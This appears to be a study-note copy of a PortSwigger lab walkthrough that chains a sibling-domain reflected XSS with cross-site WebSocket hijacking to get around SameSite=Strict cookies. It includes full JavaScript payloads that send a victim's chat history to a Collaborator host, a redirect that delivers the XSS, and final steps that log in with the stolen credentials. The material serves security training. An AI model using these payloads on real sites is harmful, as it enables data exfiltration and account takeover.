---
{"dg-publish":true,"permalink":"/src/site/notes/src/site/notes/src/site/notes/src/site/notes/main/cs/ps-wsa-labs/csrf/same-site-strict-bypass-via-sibling-domain/"}
---






### **Study the live chat feature**

1. In Burp's browser, go to the live chat feature and send a few messages.
2. In Burp, go to the **Proxy > HTTP history** tab and find the WebSocket handshake request. This should be the most recent `GET /chat` request.
3. Notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSWSH if you can bypass any [SameSite](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions) cookie restrictions.
4. In the browser, refresh the live chat page.
5. In Burp, go to the **Proxy > WebSockets history** tab. Notice that when you refresh the page, the browser sends a `READY` message to the server. This causes the server to respond with the entire chat history.

### **Confirm the CSWSH vulnerability**

1. In Burp, go to the **Collaborator** tab and click **Copy to clipboard**. A new Collaborator payload is saved to your clipboard.
2. In the browser, go to the exploit server and use the following template to create a script for a CSWSH proof of concept:`<script> var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>`
3. Store and view the exploit yourself
4. In Burp, go back to the **Collaborator** tab and click **Poll now**. Observe that you have received an HTTP interaction, which indicates that you've opened a new live chat connection with the target site.
5. Notice that although you've confirmed the CSWSH vulnerability, you've only exfiltrated the chat history for a brand new session, which isn't particularly useful.
6. Go to the **Proxy > HTTP history** tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent `GET /chat` request.
7. Notice that your session cookie was not sent with the request.
8. In the response, notice that the website explicitly specifies `SameSite=Strict` when setting session cookies. This prevents the browser from including these cookies in cross-site requests.

### **Identify an additional vulnerability in the same "site"**

1. In Burp, study the proxy history and notice that responses to requests for resources like script and image files contain an `Access-Control-Allow-Origin` header, which reveals a sibling domain at `cms-YOUR-LAB-ID.web-security-academy.net`.
2. In the browser, visit this new URL to discover an additional login form.
3. Submit some arbitrary login credentials and observe that the username is reflected in the response in the `Invalid username` message.
4. Try injecting an XSS payload via the `username` parameter, for example:`<script>alert(1)</script>`
5. Observe that the `alert(1)` is called, confirming that this is a viable [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vector.
6. Send the `POST /login` request containing the XSS payload to Burp Repeater.
7. In Burp Repeater, right-click on the request and select **Change request method** to convert the method to `GET`. Confirm that it still receives the same response.
8. Right-click on the request again and select **Copy URL**. Visit this URL in the browser and confirm that you can still trigger the XSS. As this sibling domain is part of the same site, you can use this XSS to launch the CSWSH attack without it being mitigated by SameSite restrictions.

### **Bypass the SameSite restrictions**

1. Recreate the CSWSH script that you tested on the exploit server earlier.`<script> var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>`
2. URL encode the entire script.
3. Go back to the exploit server and create a script that induces the viewer's browser to send the `GET` request you just tested, but use the URL-encoded CSWSH payload as the `username` parameter. The following is one possible approach:`<script> document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything"; </script>`
4. Store and view the exploit yourself.
5. In Burp, go back to the **Collaborator** tab and click **Poll now**. Observe that you've received a number of new interactions, which contain your entire chat history.
6. Go to the **Proxy > HTTP history** tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent `GET /chat` request.
7. Confirm that this request does contain your session cookie. As it was initiated from the vulnerable sibling domain, the browser considers this a same-site request.

### **Deliver the exploit chain**

1. Go back to the exploit server and deliver the exploit to the victim.
2. In Burp, go back to the **Collaborator** tab and click **Poll now**.
3. Observe that you've received a number of new interactions.
4. Study the HTTP interactions and notice that these contain the victim's chat history.
5. Find a message containing the victim's username and password.
6. Use the newly obtained credentials to log in to the victim's account and the lab is solved.